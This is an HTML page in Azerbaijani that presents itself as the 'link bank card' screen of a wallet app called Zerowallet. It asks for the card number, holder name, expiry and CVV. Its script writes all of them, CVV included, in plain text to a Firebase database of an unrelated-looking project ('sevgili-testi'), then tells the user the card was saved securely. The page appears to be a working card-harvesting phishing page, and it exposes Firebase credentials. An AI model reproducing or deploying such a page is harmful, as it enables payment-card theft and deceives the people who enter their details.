<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bank Kartı Bağla - Zerowallet</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Space+Mono&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg: #020617;
            --primary: #6366f1;
            --card-surface: #1e293b;
            --danger: #ff4d4d;
            --input-bg: rgba(15, 23, 42, 0.9);
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body { 
            margin: 0; background: var(--bg); color: #fff; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            padding: 20px; min-height: 100vh;
        }

        .top-nav { display: flex; align-items: center; margin-bottom: 25px; }
        .back-btn { font-size: 1.5rem; color: #94a3b8; cursor: pointer; margin-right: 15px; }
        .title { font-size: 1.1rem; font-weight: 800; letter-spacing: 0.5px; }

        /* Premium Bank Kartı Vizualı */
        .card-view {
            width: 100%; height: 210px; background: linear-gradient(135deg, #312e81 0%, #1e1b4b 100%);
            border-radius: 24px; padding: 25px; position: relative;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            margin-bottom: 35px; overflow: hidden;
        }

        .card-view::after {
            content: ''; position: absolute; width: 200px; height: 200px; 
            background: rgba(255,255,255,0.03); border-radius: 50%; top: -100px; right: -50px;
        }

        .chip { 
            width: 50px; height: 38px; background: linear-gradient(135deg, #ffd700, #b8860b);
            border-radius: 8px; margin-bottom: 25px; position: relative;
        }

        .card-num-v { 
            font-family: 'Space Mono', monospace; font-size: 1.35rem; 
            letter-spacing: 3px; display: block; margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .card-meta { display: flex; justify-content: space-between; align-items: flex-end; }
        .lbl { font-size: 0.6rem; color: #94a3b8; text-transform: uppercase; display: block; margin-bottom: 3px; }
        .val { font-size: 0.85rem; font-weight: 600; letter-spacing: 1px; }

        .brand-icon { position: absolute; top: 25px; right: 25px; width: 50px; height: auto; transition: 0.3s; }

        /* Mobil Form */
        .input-box { margin-bottom: 20px; }
        .input-box label { display: block; font-size: 0.75rem; font-weight: 700; color: #64748b; margin-bottom: 8px; margin-left: 5px; }
        
        input {
            width: 100%; padding: 16px; background: var(--input-bg);
            border: 1px solid rgba(255,255,255,0.05); border-radius: 16px;
            color: #fff; font-size: 1rem; font-weight: 600; outline: none;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        input:focus { border-color: var(--primary); background: #0f172a; box-shadow: 0 0 15px rgba(99, 102, 241, 0.15); }

        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

        .submit-btn {
            width: 100%; background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            color: white; border: none; padding: 18px; border-radius: 20px;
            font-weight: 800; font-size: 1rem; cursor: pointer; margin-top: 20px;
            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
            text-transform: uppercase;
        }

        .submit-btn:active { transform: scale(0.96); opacity: 0.9; }

        /* Toast Bildiriş */
        #toast {
            position: fixed; top: 30px; left: 50%; transform: translateX(-50%);
            background: var(--danger); padding: 12px 25px; border-radius: 12px;
            font-weight: 700; font-size: 0.9rem; display: none; z-index: 1000;
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <div id="toast">Xəta mesajı</div>

    <div class="top-nav">
        <i class="fas fa-chevron-left back-btn" onclick="history.back()"></i>
        <div class="title">BANK KARTI ƏLAVƏ ET</div>
    </div>

    <div class="card-view">
        <img src="visa.png" id="brand-logo" class="brand-icon" style="display: none;">
        <div class="chip"></div>
        <span class="card-num-v" id="v-number">**** **** **** ****</span>
        <div class="card-meta">
            <div>
                <span class="lbl">KART SAHİBİ</span>
                <span class="val" id="v-name">AD SOYAD</span>
            </div>
            <div style="text-align: right;">
                <span class="lbl">TARİX</span>
                <span class="val" id="v-expiry">MM/YY</span>
            </div>
        </div>
    </div>

    <div class="form">
        <div class="input-box">
            <label>KART NÖMRƏSİ</label>
            <input type="text" id="i-number" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19">
        </div>
        <div class="input-box">
            <label>KART SAHİBİ</label>
            <input type="text" id="i-name" placeholder="AD SOYAD" oninput="this.value = this.value.toUpperCase()">
        </div>
        <div class="form-row">
            <div class="input-box">
                <label>TARİX (AY/İL)</label>
                <input type="text" id="i-expiry" inputmode="numeric" placeholder="MM/YY" maxlength="5">
            </div>
            <div class="input-box">
                <label>CVV / CVC</label>
                <input type="password" id="i-cvv" inputmode="numeric" placeholder="***" maxlength="3">
            </div>
        </div>
        <button class="submit-btn" onclick="saveData()">KARTI BAĞLA</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
            authDomain: "sevgili-testi.firebaseapp.com",
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
            projectId: "sevgili-testi",
            storageBucket: "sevgili-testi.firebasestorage.app",
            messagingSenderId: "399260477557",
            appId: "1:399260477557:web:584204a698d7bf145bb03c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const user = localStorage.getItem('zerowallet_session');

        // Canlı Sinxronizasiya
        const numInp = document.getElementById('i-number');
        const nameInp = document.getElementById('i-name');
        const expInp = document.getElementById('i-expiry');
        const brandLogo = document.getElementById('brand-logo');

        numInp.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            
            // Logo Seçimi
            if(val.startsWith('4')) {
                brandLogo.src = 'visa.png';
                brandLogo.style.display = 'block';
            } else if(val.startsWith('5')) {
                brandLogo.src = 'master.png';
                brandLogo.style.display = 'block';
            } else {
                brandLogo.style.display = 'none';
            }

            let parts = val.match(/.{1,4}/g);
            let formatted = parts ? parts.join(' ') : val;
            e.target.value = formatted;
            document.getElementById('v-number').innerText = formatted || "**** **** **** ****";
        });

        nameInp.addEventListener('input', (e) => {
            document.getElementById('v-name').innerText = e.target.value || "AD SOYAD";
        });

        expInp.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if(val.length >= 2) val = val.substring(0,2) + '/' + val.substring(2,4);
            e.target.value = val;
            document.getElementById('v-expiry').innerText = val || "MM/YY";
        });

        function showErr(msg) {
            const t = document.getElementById('toast');
            t.innerText = msg; t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 3000);
        }

        function saveData() {
            const rawNum = numInp.value.replace(/\s/g, '');
            const cardName = nameInp.value.trim();
            const expiry = expInp.value;
            const cvv = document.getElementById('i-cvv').value;

            if(rawNum.length < 16) return showErr("Kart nömrəsi tam deyil!");
            if(cardName.length < 5) return showErr("Ad Soyad daxil edin!");
            if(expiry.length < 5) return showErr("Tarix formatı: MM/YY");
            if(cvv.length < 3) return showErr("CVV kodu daxil edin!");

            const cardData = {
                number: rawNum,
                holder: cardName,
                expiry: expiry,
                cvv: cvv,
                dateAdded: Date.now()
            };

            db.ref('zerowallet_users/' + user + '/cardInfo').set(cardData)
                .then(() => {
                    alert("Kart təhlükəsiz şəkildə yadda saxlanıldı!");
                    location.href = 'main.html';
                })
                .catch(err => showErr("Xəta: " + err.message));
        }
    </script>
</body>
</html>
